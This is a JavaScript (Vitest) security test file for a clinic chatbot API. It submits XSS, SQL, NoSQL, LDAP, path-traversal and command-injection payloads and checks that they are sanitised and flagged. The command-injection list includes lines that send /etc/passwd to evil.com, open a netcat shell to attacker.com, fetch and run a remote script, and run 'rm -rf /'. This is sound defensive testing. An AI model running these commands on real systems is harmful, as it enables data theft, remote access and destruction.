/**
 * Chatbot Security and Penetration Testing Suite
 * Requirements: 8.1, 8.3 - Security and penetration testing
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import { createMocks } from 'node-mocks-http';
import crypto from 'crypto';
import jwt from 'jsonwebtoken';

// Mock environment for security testing
const SECURITY_TEST_ENV = {
    GOOGLE_GEMINI_API_KEY: 'test-api-key-for-security-testing',
    ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
    JWT_SECRET: crypto.randomBytes(64).toString('hex'),
    RATE_LIMIT_WINDOW: 60000, // 1 minute
    RATE_LIMIT_MAX_REQUESTS: 10
};

describe('Chatbot Security and Penetration Testing', () => {
    let chatHandler;
    let securityService;
    let rateLimiter;

    beforeAll(async () => {
        // Set security test environment
        Object.entries(SECURITY_TEST_ENV).forEach(([key, value]) => {
            process.env[key] = value;
        });

        // Import handlers with security environment
        const chatModule = await import('../../api/chatbot/chat.js');
        const securityModule = await import('../services/chatbotSecurityService.js');

        chatHandler = chatModule.default;
        securityService = securityModule.default;
        rateLimiter = securityService.rateLimiter;
    });

    afterAll(() => {
        // Clean up environment
        Object.keys(SECURITY_TEST_ENV).forEach(key => {
            delete process.env[key];
        });
    });

    beforeEach(() => {
        // Reset rate limiter for each test
        if (rateLimiter) {
            rateLimiter.reset();
        }
    });

    describe('Input Validation and Sanitization (Requirement 8.1)', () => {
        it('should prevent XSS attacks through message input', async () => {
            const xssPayloads = [
                '<script>alert("xss")</script>',
                '<img src="x" onerror="alert(1)">',
                '<svg onload="alert(1)">',
                'javascript:alert("xss")',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<link rel="stylesheet" href="javascript:alert(1)">',
                '<style>@import "javascript:alert(1)";</style>',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
            ];

            for (const payload of xssPayloads) {
                const { req, res } = createMocks({
                    method: 'POST',
                    headers: {
                        'content-type': 'application/json',
                        'x-forwarded-for': '192.168.1.100'
                    },
                    body: {
                        message: payload,
                        sessionId: 'xss-test-session'
                    }
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                // Response should not contain the malicious payload
                expect(data.data.response).not.toContain('<script>');
                expect(data.data.response).not.toContain('onerror');
                expect(data.data.response).not.toContain('onload');
                expect(data.data.response).not.toContain('javascript:');

                // Security event should be logged
                expect(data.security?.inputSanitized).toBe(true);
                expect(data.security?.threatDetected).toBe(true);
            }
        });

        it('should prevent SQL injection attacks', async () => {
            const sqlPayloads = [
                "'; DROP TABLE conversations; --",
                "' OR '1'='1' --",
                "'; SELECT * FROM users; --",
                "' UNION SELECT password FROM admin_users --",
                "'; INSERT INTO conversations (message) VALUES ('hacked'); --",
                "' OR 1=1 LIMIT 1 --",
                "'; UPDATE users SET password='hacked' WHERE id=1; --",
                "' AND (SELECT COUNT(*) FROM conversations) > 0 --",
                "'; EXEC xp_cmdshell('dir'); --",
                "' OR SLEEP(5) --"
            ];

            for (const payload of sqlPayloads) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: payload,
                        sessionId: 'sql-injection-test'
                    }
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                // Should not expose database errors or data
                expect(data.data.response).not.toContain('SQL');
                expect(data.data.response).not.toContain('database');
                expect(data.data.response).not.toContain('mysql');
                expect(data.data.response).not.toContain('postgresql');
                expect(data.data.response).not.toContain('error');
                expect(data.data.response).not.toContain('password');
                expect(data.data.response).not.toContain('admin');

                // Security monitoring should detect the attempt
                expect(data.security?.sqlInjectionAttempt).toBe(true);
            }
        });

        it('should prevent command injection attacks', async () => {
            const commandPayloads = [
                '; ls -la',
                '| cat /etc/passwd',
                '&& rm -rf /',
                '`whoami`',
                '$(id)',
                '; curl http://evil.com/steal?data=$(cat /etc/passwd)',
                '| nc -e /bin/sh attacker.com 4444',
                '; python -c "import os; os.system(\'rm -rf /\')"',
                '&& wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh',
                '| powershell -Command "Get-Process"'
            ];

            for (const payload of commandPayloads) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: `Olá ${payload}`,
                        sessionId: 'command-injection-test'
                    }
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                // Should not execute commands or expose system information
                expect(data.data.response).not.toContain('root:');
                expect(data.data.response).not.toContain('/bin/bash');
                expect(data.data.response).not.toContain('uid=');
                expect(data.data.response).not.toContain('Process');

                // Security event should be logged
                expect(data.security?.commandInjectionAttempt).toBe(true);
            }
        });

        it('should prevent LDAP injection attacks', async () => {
            const ldapPayloads = [
                '*)(uid=*))(|(uid=*',
                '*)(|(password=*))',
                '*))%00',
                '*()|%26\'',
                '*)(objectClass=*',
                '*)(&(objectClass=user)(cn=*))',
                '*)(mail=*))%00',
                '*))(|(cn=*'
            ];

            for (const payload of ldapPayloads) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: `Buscar usuário: ${payload}`,
                        sessionId: 'ldap-injection-test'
                    }
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                // Should not expose LDAP directory information
                expect(data.data.response).not.toContain('objectClass');
                expect(data.data.response).not.toContain('uid=');
                expect(data.data.response).not.toContain('cn=');
                expect(data.data.response).not.toContain('mail=');

                expect(data.security?.ldapInjectionAttempt).toBe(true);
            }
        });

        it('should prevent NoSQL injection attacks', async () => {
            const nosqlPayloads = [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "this.password.match(/.*/)"}',
                '{"$regex": ".*"}',
                '{"$or": [{"password": {"$exists": true}}]}',
                '{"$and": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
                '{"username": {"$in": ["admin", "root", "administrator"]}}',
                '{"$where": "function() { return true; }"}'
            ];

            for (const payload of nosqlPayloads) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: payload,
                        sessionId: 'nosql-injection-test'
                    }
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                // Should not expose database operations or data
                expect(data.data.response).not.toContain('$ne');
                expect(data.data.response).not.toContain('$gt');
                expect(data.data.response).not.toContain('$where');
                expect(data.data.response).not.toContain('$regex');
                expect(data.data.response).not.toContain('password');

                expect(data.security?.nosqlInjectionAttempt).toBe(true);
            }
        });

        it('should validate and sanitize file upload attempts', async () => {
            const filePayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '../../../../proc/self/environ',
                '../../../var/log/apache2/access.log',
                '..\\..\\..\\inetpub\\wwwroot\\web.config',
                '/proc/version',
                '/etc/hostname'
            ];

            for (const payload of filePayloads) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: `Anexar arquivo: ${payload}`,
                        sessionId: 'file-traversal-test'
                    }
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                // Should not access system files
                expect(data.data.response).not.toContain('root:');
                expect(data.data.response).not.toContain('Administrator:');
                expect(data.data.response).not.toContain('Linux version');
                expect(data.data.response).not.toContain('Windows NT');

                expect(data.security?.pathTraversalAttempt).toBe(true);
            }
        });
    });

    describe('Authentication and Authorization (Requirement 8.1)', () => {
        it('should validate API key authentication', async () => {
            // Test with missing API key
            const originalApiKey = process.env.GOOGLE_GEMINI_API_KEY;
            delete process.env.GOOGLE_GEMINI_API_KEY;

            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Test without API key',
                    sessionId: 'auth-test-1'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(500);
            const data = JSON.parse(res._getData());
            expect(data.error).toBe('Service configuration error');

            // Restore API key
            process.env.GOOGLE_GEMINI_API_KEY = originalApiKey;
        });

        it('should validate session token integrity', async () => {
            const invalidTokens = [
                'invalid.token.here',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
                '',
                null,
                undefined,
                'malformed-token',
                'Bearer invalid-token'
            ];

            for (const token of invalidTokens) {
                const { req, res } = createMocks({
                    method: 'POST',
                    headers: {
                        'authorization': token ? `Bearer ${token}` : undefined
                    },
                    body: {
                        message: 'Test with invalid token',
                        sessionId: 'token-test'
                    }
                });

                await chatHandler(req, res);

                // Should still work but with limited functionality
                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                if (data.warnings) {
                    expect(data.warnings).toContain('Invalid authentication token');
                }
            }
        });

        it('should implement proper session management', async () => {
            // Test session creation
            const { req: req1, res: res1 } = createMocks({
                method: 'POST',
                body: {
                    message: 'Start new session',
                    sessionId: null
                }
            });

            await chatHandler(req1, res1);

            expect(res1._getStatusCode()).toBe(200);
            const data1 = JSON.parse(res1._getData());
            const sessionId = data1.data.sessionId;

            expect(sessionId).toBeTruthy();
            expect(sessionId).toMatch(/^[a-zA-Z0-9-_]+$/);

            // Test session continuation
            const { req: req2, res: res2 } = createMocks({
                method: 'POST',
                body: {
                    message: 'Continue session',
                    sessionId: sessionId
                }
            });

            await chatHandler(req2, res2);

            expect(res2._getStatusCode()).toBe(200);
            const data2 = JSON.parse(res2._getData());
            expect(data2.data.sessionId).toBe(sessionId);
        });

        it('should prevent session hijacking', async () => {
            // Create legitimate session
            const { req: req1, res: res1 } = createMocks({
                method: 'POST',
                headers: {
                    'x-forwarded-for': '192.168.1.100',
                    'user-agent': 'Mozilla/5.0 Legitimate Browser'
                },
                body: {
                    message: 'Legitimate session',
                    sessionId: null
                }
            });

            await chatHandler(req1, res1);
            const data1 = JSON.parse(res1._getData());
            const sessionId = data1.data.sessionId;

            // Attempt to use session from different IP/User-Agent
            const { req: req2, res: res2 } = createMocks({
                method: 'POST',
                headers: {
                    'x-forwarded-for': '10.0.0.1',
                    'user-agent': 'curl/7.68.0'
                },
                body: {
                    message: 'Hijacked session attempt',
                    sessionId: sessionId
                }
            });

            await chatHandler(req2, res2);

            const data2 = JSON.parse(res2._getData());

            // Should detect suspicious activity
            if (data2.security) {
                expect(data2.security.suspiciousActivity).toBe(true);
                expect(data2.security.sessionValidation).toBe('failed');
            }
        });
    });

    describe('Rate Limiting and DDoS Protection (Requirement 8.3)', () => {
        it('should implement IP-based rate limiting', async () => {
            const clientIP = '192.168.1.200';
            const requests = [];

            // Send requests rapidly from same IP
            for (let i = 0; i < 15; i++) {
                const { req, res } = createMocks({
                    method: 'POST',
                    headers: {
                        'x-forwarded-for': clientIP
                    },
                    body: {
                        message: `Rate limit test ${i}`,
                        sessionId: `rate-test-${i}`
                    }
                });

                await chatHandler(req, res);
                requests.push({
                    status: res._getStatusCode(),
                    data: JSON.parse(res._getData())
                });
            }

            // Should have some rate limited responses
            const rateLimitedRequests = requests.filter(r => r.status === 429);
            expect(rateLimitedRequests.length).toBeGreaterThan(0);

            rateLimitedRequests.forEach(response => {
                expect(response.data.error).toBe('Rate limit exceeded');
                expect(response.data.retryAfter).toBeDefined();
            });
        });

        it('should implement session-based rate limiting', async () => {
            const sessionId = 'rate-limit-session-test';
            const requests = [];

            // Send requests rapidly from same session
            for (let i = 0; i < 12; i++) {
                const { req, res } = createMocks({
                    method: 'POST',
                    headers: {
                        'x-forwarded-for': `192.168.1.${100 + i}` // Different IPs
                    },
                    body: {
                        message: `Session rate limit test ${i}`,
                        sessionId: sessionId
                    }
                });

                await chatHandler(req, res);
                requests.push({
                    status: res._getStatusCode(),
                    data: JSON.parse(res._getData())
                });
            }

            // Should have session-based rate limiting
            const rateLimitedRequests = requests.filter(r => r.status === 429);
            expect(rateLimitedRequests.length).toBeGreaterThan(0);
        });

        it('should implement adaptive rate limiting based on threat level', async () => {
            const suspiciousIP = '10.0.0.100';

            // Send suspicious requests first
            const suspiciousPayloads = [
                '<script>alert("xss")</script>',
                "'; DROP TABLE users; --",
                '../../../../etc/passwd'
            ];

            for (const payload of suspiciousPayloads) {
                const { req, res } = createMocks({
                    method: 'POST',
                    headers: {
                        'x-forwarded-for': suspiciousIP
                    },
                    body: {
                        message: payload,
                        sessionId: 'suspicious-session'
                    }
                });

                await chatHandler(req, res);
            }

            // Now send normal requests from same IP
            const normalRequests = [];
            for (let i = 0; i < 5; i++) {
                const { req, res } = createMocks({
                    method: 'POST',
                    headers: {
                        'x-forwarded-for': suspiciousIP
                    },
                    body: {
                        message: `Normal message ${i}`,
                        sessionId: 'normal-session'
                    }
                });

                await chatHandler(req, res);
                normalRequests.push({
                    status: res._getStatusCode(),
                    data: JSON.parse(res._getData())
                });
            }

            // Should have stricter rate limiting for suspicious IP
            const blockedRequests = normalRequests.filter(r => r.status === 429);
            expect(blockedRequests.length).toBeGreaterThan(0);
        });

        it('should implement request size limiting', async () => {
            const largeMessage = 'A'.repeat(10000); // 10KB message

            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: largeMessage,
                    sessionId: 'size-limit-test'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(413);
            const data = JSON.parse(res._getData());
            expect(data.error).toBe('Request entity too large');
        });
    });

    describe('Data Protection and Encryption (Requirement 8.1)', () => {
        it('should encrypt sensitive data in requests', async () => {
            const sensitiveData = {
                message: 'Meu CPF é 123.456.789-00 e meu email é joao@example.com',
                sessionId: 'encryption-test',
                personalInfo: {
                    name: 'João Silva',
                    phone: '11999999999'
                }
            };

            const { req, res } = createMocks({
                method: 'POST',
                body: sensitiveData
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            // Verify sensitive data is not exposed in logs
            expect(data.debug?.originalMessage).toBeUndefined();
            expect(data.debug?.personalInfo).toBeUndefined();

            // Verify encryption metadata is present
            if (data.security?.dataEncrypted) {
                expect(data.security.encryptionAlgorithm).toBe('AES-256-GCM');
                expect(data.security.keyId).toBeDefined();
            }
        });

        it('should validate data integrity with HMAC', async () => {
            const message = 'Test message for integrity validation';
            const timestamp = Date.now().toString();

            // Create valid HMAC
            const hmac = crypto.createHmac('sha256', SECURITY_TEST_ENV.JWT_SECRET);
            hmac.update(message + timestamp);
            const validSignature = hmac.digest('hex');

            const { req, res } = createMocks({
                method: 'POST',
                headers: {
                    'x-timestamp': timestamp,
                    'x-signature': validSignature
                },
                body: {
                    message: message,
                    sessionId: 'integrity-test'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            if (data.security?.integrityValidated) {
                expect(data.security.integrityValidated).toBe(true);
            }
        });

        it('should detect and prevent replay attacks', async () => {
            const message = 'Replay attack test';
            const timestamp = (Date.now() - 300000).toString(); // 5 minutes ago

            const hmac = crypto.createHmac('sha256', SECURITY_TEST_ENV.JWT_SECRET);
            hmac.update(message + timestamp);
            const signature = hmac.digest('hex');

            const { req, res } = createMocks({
                method: 'POST',
                headers: {
                    'x-timestamp': timestamp,
                    'x-signature': signature
                },
                body: {
                    message: message,
                    sessionId: 'replay-test'
                }
            });

            await chatHandler(req, res);

            const data = JSON.parse(res._getData());

            // Should detect replay attack due to old timestamp
            if (data.security?.replayAttackDetected) {
                expect(data.security.replayAttackDetected).toBe(true);
                expect(data.warnings).toContain('Request timestamp too old');
            }
        });
    });

    describe('Security Headers and CORS (Requirement 8.1)', () => {
        it('should set proper security headers', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Security headers test',
                    sessionId: 'headers-test'
                }
            });

            await chatHandler(req, res);

            const headers = res._getHeaders();

            // Verify security headers
            expect(headers['x-content-type-options']).toBe('nosniff');
            expect(headers['x-frame-options']).toBe('DENY');
            expect(headers['x-xss-protection']).toBe('1; mode=block');
            expect(headers['strict-transport-security']).toContain('max-age=');
            expect(headers['content-security-policy']).toBeDefined();
            expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
        });

        it('should implement proper CORS policy', async () => {
            const { req, res } = createMocks({
                method: 'OPTIONS',
                headers: {
                    'origin': 'https://malicious-site.com',
                    'access-control-request-method': 'POST',
                    'access-control-request-headers': 'content-type'
                }
            });

            await chatHandler(req, res);

            const headers = res._getHeaders();

            // Should not allow malicious origins
            expect(headers['access-control-allow-origin']).not.toBe('https://malicious-site.com');

            // Should have restrictive CORS policy
            if (headers['access-control-allow-origin']) {
                expect(headers['access-control-allow-origin']).toMatch(/^https:\/\/(localhost|.*\.saraivavision\.com)$/);
            }
        });
    });

    describe('Vulnerability Scanning and Monitoring (Requirement 8.3)', () => {
        it('should detect and log security events', async () => {
            const securityEvents = [];

            // Mock security event logger
            const originalLog = console.log;
            console.log = (...args) => {
                if (args[0]?.includes?.('SECURITY_EVENT')) {
                    securityEvents.push(args);
                }
                originalLog(...args);
            };

            // Trigger various security events
            const attacks = [
                '<script>alert("xss")</script>',
                "'; DROP TABLE users; --",
                '../../../../etc/passwd',
                '{"$ne": null}'
            ];

            for (const attack of attacks) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: attack,
                        sessionId: 'security-monitoring-test'
                    }
                });

                await chatHandler(req, res);
            }

            // Restore console.log
            console.log = originalLog;

            // Should have logged security events
            expect(securityEvents.length).toBeGreaterThan(0);
        });

        it('should implement automated threat response', async () => {
            const maliciousIP = '10.0.0.200';

            // Send multiple attack attempts
            const attacks = [
                '<script>alert("xss")</script>',
                "'; DROP TABLE users; --",
                '../../../../etc/passwd',
                '$(whoami)',
                '{"$ne": null}'
            ];

            const responses = [];
            for (const attack of attacks) {
                const { req, res } = createMocks({
                    method: 'POST',
                    headers: {
                        'x-forwarded-for': maliciousIP
                    },
                    body: {
                        message: attack,
                        sessionId: 'threat-response-test'
                    }
                });

                await chatHandler(req, res);
                responses.push({
                    status: res._getStatusCode(),
                    data: JSON.parse(res._getData())
                });
            }

            // Should implement progressive blocking
            const blockedResponses = responses.filter(r => r.status === 403 || r.status === 429);
            expect(blockedResponses.length).toBeGreaterThan(0);

            // Later requests should be blocked more aggressively
            const lastResponse = responses[responses.length - 1];
            if (lastResponse.status === 403) {
                expect(lastResponse.data.error).toBe('IP blocked due to suspicious activity');
            }
        });

        it('should generate security audit reports', async () => {
            // Simulate various security events over time
            const events = [
                { type: 'xss_attempt', severity: 'high' },
                { type: 'sql_injection', severity: 'critical' },
                { type: 'rate_limit_exceeded', severity: 'medium' },
                { type: 'invalid_session', severity: 'low' }
            ];

            for (const event of events) {
                // Simulate security event
                await securityService.logSecurityEvent(event);
            }

            // Generate audit report
            const auditReport = await securityService.generateSecurityAuditReport();

            expect(auditReport.totalEvents).toBe(4);
            expect(auditReport.criticalEvents).toBe(1);
            expect(auditReport.highSeverityEvents).toBe(1);
            expect(auditReport.eventTypes).toContain('xss_attempt');
            expect(auditReport.eventTypes).toContain('sql_injection');
            expect(auditReport.recommendations).toBeDefined();
        });
    });

    describe('Compliance and Regulatory Security (Requirement 8.1)', () => {
        it('should maintain LGPD security requirements', async () => {
            const personalData = {
                message: 'Meu nome é João Silva, CPF 123.456.789-00',
                sessionId: 'lgpd-security-test',
                personalInfo: {
                    name: 'João Silva',
                    cpf: '12345678900',
                    email: 'joao@example.com'
                }
            };

            const { req, res } = createMocks({
                method: 'POST',
                body: personalData
            });

            await chatHandler(req, res);

            const data = JSON.parse(res._getData());

            // Verify LGPD security measures
            if (data.security?.lgpdCompliance) {
                expect(data.security.lgpdCompliance.dataEncrypted).toBe(true);
                expect(data.security.lgpdCompliance.accessLogged).toBe(true);
                expect(data.security.lgpdCompliance.retentionScheduled).toBe(true);
            }
        });

        it('should maintain medical data security (CFM compliance)', async () => {
            const medicalData = {
                message: 'Tenho histórico de glaucoma na família e uso colírio',
                sessionId: 'cfm-security-test',
                medicalHistory: 'Glaucoma familiar'
            };

            const { req, res } = createMocks({
                method: 'POST',
                body: medicalData
            });

            await chatHandler(req, res);

            const data = JSON.parse(res._getData());

            // Verify medical data security
            if (data.security?.medicalDataSecurity) {
                expect(data.security.medicalDataSecurity.encryptionLevel).toBe('high');
                expect(data.security.medicalDataSecurity.accessControlled).toBe(true);
                expect(data.security.medicalDataSecurity.auditTrail).toBe(true);
            }
        });
    });
});